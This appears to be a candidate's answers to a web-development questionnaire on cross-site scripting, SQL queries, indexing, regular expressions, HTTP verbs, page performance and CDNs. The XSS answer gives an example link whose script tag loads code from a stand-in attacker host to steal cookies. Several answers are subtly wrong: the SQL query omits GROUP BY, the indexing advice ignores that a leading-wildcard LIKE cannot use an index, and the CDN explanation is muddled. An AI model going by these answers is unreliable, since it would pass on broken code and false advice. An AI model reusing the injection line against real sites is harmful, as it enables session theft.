##Question 1: What is Cross-site scripting and how can it be protected against?

Cross Site Scripting (XSS) is a client side security flaw that enables an attacker to inject client side scripts into a webpage, in hope of stealing someone else's user account (or anything useful really). This happens when the input in a form field or search box is not encoded or validated after submission. For example, when a user enters a search query such as

`http://someDomain.com?search=<script type="text/javascript">Alert("Yo I'm about to steal some stuff from you"</script>`
into a search field and a webpage accepts the user input and the codes run it. This is deadly because when a user visits a webpage and enter his or her user credential, a cookie is usually stored on the browser. An attacker can pretend to be a friend and send an email to ask you to visit the page which assumes to be save, such as

`http://someDomain.com?search=<script src="http://stealingYourStuff.com/attackerScript.js">Alert("Yo I'm about to steal some stuff from you"</script>`

and the end user opens this link, the script will run and send the user credential stored in the browser's cookie to the attacker's server. `This basically triggers an XSS attack`. Now, the attacker can use the user's cookie and put it in his or her browser and pretend to be that user.

There are a number of ways to prevent this from happening:

1. When the user include a script as an input, the server should redirect to a page that tells the user that the request is invalid (instead of triggering the script).
2. If multiple logins from two different locations are found, the server should invalidated the cookie session.
3. One of the best is to not click on any unknown emails.
4. Perhaps ensure proper escaping or sanitation of the user search input or any form field.



##Question 2: Database Query
To get the desire table, we can make two inner joins for providers, payment_types, and provider_payment_types, where the provider_id and payment_type_id in provider_payment_types correspond to the provider_id in providers table and payment_type_id in payment_types table (respectively).

`SELECT payment_types.name, count(provider_payment_types.payment_type_id) as count
FROM payment_types
INNER JOIN provider_payment_types on provider_payment_types.payment_type_id=payment_types.id
INNER JOIN providers on provider_payment_types.provider_id=providers.id
ORDER BY count DESC;`


##Question 3: Large Data Sets

`SELECT * FROM providers WHERE name LIKE '%care home%';`

If the providers table has 200,000 entries, what could we do to improve the speed of this search?

We can provide the `index` in name. Indexing a database is similar to indexing a textbook where each phrase corresponds to a page. It works the same way in a database. When we create a table with some columns, we can index it to help us retrieve the data faster, in this case, name.

##Question 4: Regular Expressions

The result of `"(855) 277-6736".replace(/[^0-9]/g, '');` is `8552776736`

The `[^0-9]` means that we find any digit (or in this case, characters) that is NOT within the brackets. In this case, `(`, `)`, empty space, `-` are not between 0-9, so we replace all the non-number characters with an empty string.

The `g` is just telling us that the search within `[^0-9]` is global, which means it will continue searching after the first one.

An alternative to using `[^0-9]` in Javascript is `\D` which is to search for non-digit characters.

Although, `(855) 277-6736` is just a phone number that is easy to read and follows the convention, but the computer does not understand the non-digit characters when we attempt to dial the number (for example).


##Question 5: HTTP Requests
An HTTP request happens when your browser tries to fetch certain webpage (GET verb). It will tell the server that it is visiting this page and request the proper assets (images, CSS, Javascript, etc) in order to load the page. The server will return the required assets so the browser can then load the pages. There are four primary HTTP verbs that are commonly used in a restful services:

1. GET: This is to retrieve a webpage or data.
2. POST: This verb is being used to create data and then send it to the server. This is commonly used in a form field.
3. PUT (UPDATE): This is similar to the POST verb but it is used to update data. For example, when a user updates his or her information on an account, the PUT method is used. Although POST can also be used, but it will not be restful.
4. DELETE: This verb is being used to delete a data. For example, one can delete a user data from the database with this method.

##Question 6: Performance

First, I think we have a lot of Javascript and CSS codes that are not minified. We can greatly improve page loading when all codes have been minified which is the removal of all the unneeded white space, new lines, comments, etc. The extra lines, white spaces, comments, etc do take up memory and when millions of users are requesting the same assets, it does add up.

Second, it does not look like the CSS/JS files are bundled together. After minification, the CSS files can be bundled into one master file (likewise for JS files). When this happens, the HTML page only needs to make fewer requests to get the Javascript and CSS assets.

##Question 7: CDNs

CDN, which is short for content delivery network, is a way to deliver assets such as javascripts, CSS, images, etc. to users based on where they live (this means multiple servers are used to deliver the contents based on location). One advantage of CDNs is that certain contents are cached in a user's browser and can be reused later in time when the user visits the webpage again. The user does not need to make the same requests to the server to obtain the necessary assets to load the webpage (which in turns increase the page load). Caching is commonly used for a popular library like jQuery.

Even though the versioning of the jQuery library is specified in the url `https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.js`, we can also take advange of caching and use version query `?version=2.2.2` or `?ver=2.2.2` to specified the specific version when multiple jquery.js is uploaded to the CDN. This eliminates `2.2.2` subdirectory. However, this method should be used with care as it can be confusing to reference the version number when multiple copies have the same file name.

For a page that loads many static assets, we want to load the assets from different domains or CDNs in order to speed up the page load. If a single CDN is down, a second one that is a backup can be used. This prevents any downtime.

